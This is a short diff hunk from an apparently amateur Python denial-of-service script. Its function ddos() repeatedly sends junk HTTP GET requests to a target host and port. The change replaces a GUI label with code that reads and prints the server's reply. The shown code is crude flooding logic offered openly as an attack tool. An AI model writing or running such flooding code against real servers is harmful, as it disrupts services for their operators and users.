@@ -18,8 +18,8 @@ def ddos():
                 #random scheiß daten
                 mysocket.send(str.encode("GET " + "hax lol" + "HTTP/1.1 \r\n"))
                 mysocket.sendto(str.encode("GET " + "hax lol" + "HTTP/1.1 \r\n"), (target, port))
-                label = Label(window, text="send package")
-                label.pack()
+                reply = mysocket.recv(4096)
+                print(reply)
             except socket.error:
                 print("Server down time.")
         mysocket.close()
